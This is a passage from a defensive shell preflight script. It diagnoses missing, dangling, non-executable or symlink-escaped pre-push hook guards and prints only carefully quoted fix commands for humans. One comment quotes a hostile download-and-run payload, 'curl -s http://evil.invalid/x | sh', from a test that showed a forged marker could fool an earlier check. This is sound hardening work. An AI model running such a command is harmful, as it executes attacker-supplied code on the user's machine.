  # correct answer instead of "unknown option". `cd` + `pwd -P` is version-agnostic and physical — the
  # same form $GUARD_HOOK carries, so the two halves of the command agree. Locked by legs MP1 and MP5.
  # Unresolvable => leave it relative: strictly no worse than before, and never an invented path.
  _g_src="hooks/pre-push"
  _g_top=$(git rev-parse --show-toplevel 2>/dev/null) || _g_top=""
  _g_abs=""
  if [ -n "$_g_top" ]; then
    _g_abs=$( CDPATH='' cd -- "$_g_top" 2>/dev/null && pwd -P ) || _g_abs=""
    [ -z "$_g_abs" ] || _g_src="$_g_abs/hooks/pre-push"
  fi
  # RULE 2 ON THE SOURCE HALF TOO. check_guard_installed already rejected a hostile $GUARD_HOOK, but
  # $_g_src is derived from a DIFFERENT root (`--show-toplevel`, i.e. the WORKTREE) and in a linked
  # worktree the two can differ: a clean main `.git` with a hostile worktree path reaches here with
  # GUARD_HOOK safe and _g_src not. Testing only the one that had already been fixed is precisely the
  # partial-application pattern this fix-loop exists to close. Locked by leg E4.
  _g_hostile=0
  guard_path_hostile "$_g_src" && _g_hostile=1
  # OWNERSHIP OF THE SOURCE (finding X1, part 1). An install command names a file this script is telling
  # a human to make EXECUTABLE inside `.git/hooks/`. Offering one is only defensible for a tree the
  # operator asserted ownership of — and `--show-toplevel` != `$PWD` means they did not: CP-4 and CP-11
  # both refuse that shape, so the ONLY way to reach here with the two differing is `--allow-nested`,
  # under which the source named is the ENCLOSING repository's hook. REPRODUCED cross-repo: the trusted
  # kit's preflight vouched for a foreign repo's `hooks/pre-push`, a genuine trust-boundary crossing,
  # made worse by `hooks/pre-push` having no CODEOWNERS rule (so it is PR-modifiable).
  # NO SIGNAL DISTINGUISHES the benign monorepo-subdirectory case from the hostile enclosing-repo case
  # — both are exactly "cwd is not the toplevel" — so this fails safe and SIGNPOSTS the recovery
  # (re-run from the repo root) rather than relaxing. The check still JUDGES; only the command is
  # withheld. Locked by leg MP5 (rewritten from asserting the command IS printed to asserting it is
  # NOT) and MP11.
  _g_owned=1
  _g_pwd=$(pwd -P 2>/dev/null) || _g_pwd=""
  if [ -z "$_g_abs" ] || [ -z "$_g_pwd" ] || [ "$_g_abs" != "$_g_pwd" ]; then _g_owned=0; fi
  echo "" >&2
  echo "ERROR: this repository's pre-push runtime guard is not in force." >&2
  # THE `hook:` LINE IS SUPPRESSED FOR EXACTLY ONE STATE, rather than that state getting an early
  # `exit 1` of its own. An early exit would need its own copy of the closing ceiling paragraph, and two
  # copies of a disclosure is how one of them goes stale — which is the Y2 finding one level up. One
  # ceiling, one lock, every state falls through to it.
  if [ "$GUARD_STATE" != hostile-path ]; then printf '%s\n' "  hook: $GUARD_HOOK" >&2; fi
  case "$GUARD_STATE" in
    hostile-path)
      # The one state that must print NO path at all — printing it is the attack (Rule 2).
      echo "  This repository's path (or its core.hooksPath) contains a CONTROL CHARACTER — a newline or" >&2
      echo "  similar. Nothing here will echo it: a path carrying a newline forges whole lines into this" >&2
      echo "  message, including a fake install command. Rename the directory (or fix .git/config), then" >&2
      echo "  re-run. No command is offered and no path is printed while that is true." >&2 ;;
    absent)
      echo "  git clones neither .git/hooks/ nor .git/config, so a FRESH CLONE of an incepted repo has" >&2
      echo "  no local guard at all: force-push and push-to-main are unblocked in this working copy." >&2
      echo "" >&2
      # THE SOURCE IS SHOWN TO A HUMAN, NEVER VOUCHED FOR (findings J2 then X1). The T2 fix-loop added a
      # `guard_is_kit_hook "$_g_src"` gate here and treated a TRUE as verification. It is not: the
      # predicate is `grep -q KIT_GUARD_CORE`, a SUBSTRING test on a public token, and a hostile hook
      # carrying it in a COMMENT plus `curl -s http://evil.invalid/x | sh` received the full vouched
      # `cp … && chmod +x …` (measured 2026-07-21). MP7 passed only because its fixture omitted the
      # token — it modelled an attacker who did not try. Overclaiming a control is itself the defect, so
      # the vouch is withdrawn rather than strengthened: no shell-script test can establish that an
      # arbitrary file is the kit's guard, and pretending otherwise is what made the refusal dangerous.
      #
      # What replaces it, in the order a human needs it:
      #   1. OWNERSHIP  — no command at all for a tree the operator did not assert ownership of ($_g_owned).
      #   2. FIRST FILTER — guard_is_kit_hook may still REJECT (no marker / missing / unreadable). Cheap,
      #                    dispositive in one direction only, and it keeps MP7/MP8 meaningful.
      #   3. EVIDENCE   — a REFERENCE to the file (path + sha256 + how to inspect it), never a rendering
      #                    of it. See Rule 4 where guard_excerpt used to be: the T3 revision of this list
      #                    said "the sha256 and a rendered-inert excerpt", and that excerpt was the
      #                    security re-review's BLOCK (H-1). A verdict that displays attacker-controlled
      #                    content is forgeable by RENDERING however clean its bytes are filtered.
      #   4. WORDING    — "inspect this file; if it IS the kit's guard, run:". The command is offered as
      #                    conditional on the human's judgment, which is the only verifier in the loop.
      # The path is always NAMED (the operator needs to know which file is meant) but only ever as a
      # labelled fact; every path inside a runnable line goes through guard_shq (Rule 1).
      # Locked by legs MP7 (filter rejects), MP8 (absent source), MP10 (a forged marker gets no vouch),
      # MP11/MP5 (unowned tree gets no command) and Q1 (the emitted line is injection-inert).
      if [ "$_g_hostile" -eq 1 ]; then
        echo "  NO INSTALL COMMAND IS OFFERED. This tree's own path contains a control character, so the" >&2
        echo "  source path cannot be printed without forging lines into this message. Rename it, re-run." >&2
      elif [ "$_g_owned" -eq 0 ]; then
        # W-1: THE HONEST LIMITATION, WITHOUT THE ACCUSATION. The T3 wording told the reader the tree was
        # "not a tree you asserted ownership of" — accurate about what the CHECK knows, and an insult to
        # the overwhelmingly common case, which is a developer in a monorepo package. The check cannot
        # tell that case from a run inside someone else's repository, so it says exactly that and stops.
        # A refusal a legitimate user reads as a suspicion is a refusal they learn to route around.
        echo "  NO INSTALL COMMAND IS OFFERED — a limit of what this check can KNOW, not a judgment about" >&2
        echo "  you. preflight is running below the root of its repository (only --allow-nested gets" >&2
        echo "  here), so the 'hooks/pre-push' it can see belongs to the ENCLOSING repository. That is the" >&2
        echo "  ordinary shape of a monorepo package — and it is also the shape of a run inside a" >&2
        echo "  repository someone else controls. From here those two are indistinguishable, so nothing" >&2
        echo "  is offered that would make a file from another repository executable inside .git/hooks/." >&2
        printf '%s\n' "    hook source not offered from: $_g_src" >&2
        echo "  Re-run preflight from that repository's own root and the install command comes back." >&2
      elif [ ! -f "$_g_src" ] || ! guard_is_kit_hook "$_g_src"; then
        # `[ ! -f ]` FIRST, AND IT IS NOT COSMETIC ORDERING (finding LOW-2). Everything downstream of
        # here READS the source to EOF — `grep -q` in guard_is_kit_hook, then the hasher in guard_sha256
        # — and a source that is not a regular file may have no EOF. MEASURED (2026-07-21): with
        # `hooks/pre-push` a FIFO with no writer, or a symlink to /dev/zero, the whole script blocked on
        # `grep -q KIT_GUARD_CORE` and never terminated; under a 20 s alarm rc 142, output stopped after
        # the "no local guard at all" line. Symlinks are tracked git content, so a PR introduces this and
        # stalls every CI job that runs preflight until the job timeout — a gate that hangs reports
        # nothing and burns the runner, which is strictly worse than a gate that reds.
        # THE DESTINATION SIDE ALREADY DID THIS (`[ ! -f "$GUARD_HOOK" ]` in check_guard_installed); the
        # source side simply never got the same test. Testing only the half that had already been fixed
        # is the partial-application pattern this whole fix-loop exists to close.
        # `-f` FOLLOWS SYMLINKS, which is what is wanted: the question is what the source IS, not how it
        # is reached, and an ordinary symlinked source (the L-2 fixture) stays supported.
        # ONE TEST COVERS BOTH UNBOUNDED READS because the digest is only ever reached on the `else`
        # branch this condition guards — stated rather than implied, since that is a dependency a future
        # edit could break by moving guard_sha256 earlier.
        # A NON-REGULAR SOURCE FALLS IN HERE RATHER THAN GETTING ITS OWN ARM: the answer is identical
        # (no command, name the file, say why) and a second near-duplicate arm is how one of the two goes
        # stale — the Y2 finding. The parenthetical below is widened so the message is TRUE for the state
        # it now covers. Locked by leg MP13, whose mutant does not fail — it HANGS.
        echo "  NO INSTALL COMMAND IS OFFERED. This tree's hooks/pre-push does not even carry the kit's" >&2
        echo "  KIT_GUARD_CORE marker (it is missing, NOT A REGULAR FILE, unreadable, or unmarked), so it" >&2
        echo "  fails the cheapest filter there is — and a 'cp' line for an unchecked script is how a" >&2
        echo "  refusal becomes the attack." >&2
        printf '%s\n' "    rejected source: $_g_src" >&2
        echo "  Re-export the kit (adopter-export.sh) to restore it, then re-run this check." >&2
      else
        # NOT A VOUCH — say so before naming anything, so the path and digest are read as evidence for
        # the human's decision rather than as this script's conclusion. NOTHING OF THE FILE'S CONTENT IS
        # PRINTED: see Rule 4 where guard_excerpt used to be (finding H-1). The file is REFERENCED —
        # path, digest, and the tools that can actually discriminate — and the reader is sent to it.
        echo "  A CANDIDATE SOURCE EXISTS, AND NOTHING HERE HAS VERIFIED IT. It carries the KIT_GUARD_CORE" >&2
        echo "  marker, but that marker is a public substring anyone can put in a comment — it can reject a" >&2
        echo "  file, it cannot vouch for one. YOU are the verifier, and none of that file's CONTENT is" >&2
        echo "  shown here on purpose: a preview inside a security verdict can be made to render as" >&2
        echo "  anything, and a payload one line past it is invisible. Go and read it:" >&2
        printf '%s\n' "    source:  $_g_src" >&2
        # L-2: a SYMLINKED source's origin is otherwise masked. The path above reads as an in-tree file
        # even when it points outside the repository entirely; the digest and any inspection describe the
        # TARGET, so nothing was forged — but the reader was being handed the wrong provenance. The link
        # target is filesystem content, i.e. attacker-controlled, so RULE 2 applies to it exactly as it
        # does to any other path this block prints, and RULE 1 to the copy inside the `less` line below.
        # `readlink` is not in POSIX; it degrades the way guard_sha256 does — a stated absence, never a
        # blank where a fact belongs.
        _g_lnk=""
        if [ -h "$_g_src" ]; then
          if command -v readlink >/dev/null 2>&1; then
            _g_lnk=$(readlink -- "$_g_src" 2>/dev/null) || _g_lnk=""
            case "$_g_lnk" in
              ''|/*) : ;;
              *) _g_lnk="$(dirname -- "$_g_src")/$_g_lnk" ;;
            esac
            [ -z "$_g_lnk" ] || _g_lnk=$(guard_resolve_deep "$_g_lnk") || _g_lnk=""
          fi
          if [ -z "$_g_lnk" ]; then
            echo "    NOTE:    that path is a SYMLINK; its target could not be resolved here (no readlink" >&2
            echo "             on PATH, or an unresolvable target). The digest below describes the TARGET." >&2
          elif guard_path_hostile "$_g_lnk"; then
            echo "    NOTE:    that path is a SYMLINK whose target contains a CONTROL CHARACTER — it is NOT" >&2
            echo "             printed here (Rule 2). Resolve it yourself before trusting anything below." >&2
          else
            printf '%s\n' "    SYMLINK: it points at $_g_lnk — that is the file the digest describes," >&2
            echo "             not the in-tree path it looks like." >&2
          fi
        fi
        _g_sum=$(guard_sha256 "$_g_src")
        if [ -n "$_g_sum" ]; then
          printf '%s\n' "    sha256:  $_g_sum" >&2
        else
          echo "    sha256:  (no shasum/sha256sum on PATH — compare the file by hand)" >&2
        fi
        # THE AFFORDANCES, not a preview. These are the two things that can actually discriminate a kit
        # guard from a hostile look-alike, and both are the reader's own tools running under the reader's
        # own terminal, where they can page, search and see the WHOLE file. Rule 1 quotes the path; the
        # `git log -p` form needs none — `_g_owned` is 1 on this branch, so the cwd IS the repository
        # root and `hooks/pre-push` is the correct repo-relative pathspec there.
        printf '%s\n' "    inspect: less $(guard_shq "$_g_src")        # the WHOLE file, not a preview" >&2
        echo "             git log -p -- hooks/pre-push     # who changed it, and when" >&2
        # THE TOCTOU IS DISCLOSED, NOT PRETENDED AWAY. Nothing here can hold the file still between this
        # digest and the paste below, so the message says so instead of implying the digest is a lock.
        echo "  Then re-check: re-run this digest immediately before you paste the command below — the" >&2
        echo "  file can change between the two, and nothing here can prevent that." >&2
        echo "" >&2
        echo "  If — and only if — that IS the kit's guard, a HUMAN can run this (.git/ is control-plane," >&2
        echo "  so an agent seat is denied it):" >&2
        # mkdir -p FIRST, matching scripts/incept.sh:964, which performs it before the identical
        # `cp … && chmod +x`. Same edge as Y1: `.git/hooks` is not guaranteed to exist (an empty
        # --template creates a repo without it), and a fix line that fails on a legitimate repo teaches
        # the reader the tool is wrong rather than that the tree is.
        printf '%s\n' "    mkdir -p $(guard_shq "$(dirname -- "$GUARD_HOOK")") && cp $(guard_shq "$_g_src") $(guard_shq "$GUARD_HOOK") && chmod +x $(guard_shq "$GUARD_HOOK")" >&2
      fi ;;
    hooks-escape)
      # M-1. The state that supersedes whatever the cascade decided, because whatever the cascade
      # decided, its fix would act OUTSIDE this repository. NO COMMAND — the same answer `dangling`
      # gives, for the same reason, one path component up. The escaped path IS named (the operator
      # cannot fix what they cannot see, and the `hook:` line above already printed it as a labelled
      # fact) but never inside a runnable line.
      echo "  The hooks DIRECTORY for this repository resolves to a location OUTSIDE its git dir — it is" >&2
      echo "  a symlink, or reached through one. git will happily run a hook from there, but every fix" >&2
      echo "  this message could offer (cp, chmod) would create or change an executable outside this" >&2
      echo "  repository, at a path something else controls. That is the escape the dangling-symlink" >&2
      echo "  state refuses one component down, so it is refused here too." >&2
      echo "" >&2
      echo "  NO INSTALL COMMAND IS OFFERED. Inspect that redirection first (a HUMAN must — .git/ is" >&2
      echo "  control-plane, so an agent seat is denied it):" >&2
      # THE LINK, NOT THE TARGET. `$GUARD_HOOK` has already been resolved PHYSICALLY (guard_resolve_deep
      # ends in `pwd -P`), so its dirname is where the link POINTS — `ls -ld` on that shows a plain
      # directory and teaches the operator nothing. The link itself lives at <git common dir>/hooks, so
      # that is what is derived here. RULE 2 applies: `--git-common-dir` is a DIFFERENT derivation from
      # the one check_guard_installed already vetted, and vetting only the path that had already been
      # fixed is the partial-application pattern this fix-loop exists to close (the same reasoning as
      # `_g_src` above).
      _g_hdir=$(git rev-parse --git-common-dir 2>/dev/null) || _g_hdir=""
      [ -z "$_g_hdir" ] || _g_hdir=$(guard_resolve_deep "$_g_hdir") || _g_hdir=""
      if [ -n "$_g_hdir" ] && ! guard_path_hostile "$_g_hdir"; then
        printf '%s\n' "    ls -ld $(guard_shq "${_g_hdir%/}/hooks")" >&2
      else
        echo "    ls -ld <this repository's .git/hooks>    # its path cannot be printed safely here" >&2
      fi
      echo "  If the redirection is not deliberate, remove it so .git/hooks is a real directory inside" >&2
      echo "  this repository, then re-run this check to get the install command." >&2 ;;
    dangling)
      echo "  The hook path is a SYMLINK whose target does not exist. git runs nothing, so this tree is as" >&2
      echo "  unguarded as an empty one — and re-installing is the WRONG fix: a 'cp' would write THROUGH" >&2
      echo "  the link to whatever it points at, and chmod +x that, outside this repository." >&2
      echo "" >&2
      echo "  Fix (a HUMAN must run this — .git/ is control-plane, so an agent seat is denied):" >&2
      printf '%s\n' "    rm $(guard_shq "$GUARD_HOOK")    # remove the link, then re-run to get the install command" >&2 ;;
    inert)
      echo "  The hook is present and carries the kit's marker, but it is NOT EXECUTABLE — git silently" >&2
      echo "  ignores it, so nothing runs on push. Re-installing is not the fix; the permission bit is." >&2
      echo "" >&2
      echo "  Fix (a HUMAN must run this — .git/ is control-plane, so an agent seat is denied):" >&2
      printf '%s\n' "    chmod +x $(guard_shq "$GUARD_HOOK")" >&2 ;;
    unreadable)
      echo "  The hook is present but cannot be READ, so nothing here can even check it for the kit's" >&2
      echo "  marker. It is refused rather than assumed foreign: an unchecked hook waved through is a" >&2
      echo "  silent hole." >&2
      echo "" >&2
      echo "  Fix (a HUMAN must run this — .git/ is control-plane, so an agent seat is denied):" >&2
      printf '%s\n' "    chmod +r $(guard_shq "$GUARD_HOOK")    # then re-run; a genuine foreign hook is left alone" >&2 ;;
    *)
      # Unreachable from today's three armed states, and deliberately generic rather than a guess: a
      # future state that armed the refusal without teaching this block would otherwise be handed the
      # WRONG fix line, confidently. Naming the state is the honest answer to "I do not know the fix".
      printf '%s\n' "  Guard state: ${GUARD_STATE:-unknown} — inspect the hook above; it is not in force." >&2 ;;
  esac
  echo "" >&2
  echo "  THE CEILING, stated so a fixed guard is not read as more than it is: this hook is a SPEED BUMP," >&2
  echo "  not a boundary (docs/enterprise/platform-safety-boundary.md). Installing it does NOT make main" >&2
  echo "  safe. With solo enforce_admins:false the repository owner can still advance main from ANY clone" >&2
  echo "  — the bypass is server-side, where no local hook can see it — and --no-verify skips the hook" >&2
  echo "  outright. The boundary is platform-owned; see docs/operations/review-lane.md." >&2
  exit 1
fi

if [ "$miss" -ne 0 ]; then
  echo "Missing prerequisites above — install them, then re-run."
  exit 1
fi

# A SUPPRESSED REFUSAL MUST NEVER READ AS A PASS: the escape proceeds (exit 0 — the operator asked for
# it), but it does NOT get the clean green. Anyone reading this output, or pasting it into a field-test
# report, sees an unsupported run for what it is.
if [ "$RUNTIME_WAIVED" -eq 1 ]; then
  # Rule 3 (finding L-3, the class): same three variables as the ERROR block above, same mechanism.
  printf '%s\n' "Prerequisites present, but this is an UNSUPPORTED runtime: node $RUNTIME_FOUND < the required"
  printf '%s\n' "Node $RUNTIME_FLOOR floor ($RUNTIME_SRC). Proceeding only because --allow-runtime-mismatch was passed."
  echo "This is NOT a supported configuration — failures beyond this point are expected, not defects."
  exit 0
fi

echo "All prerequisites present."
exit 0
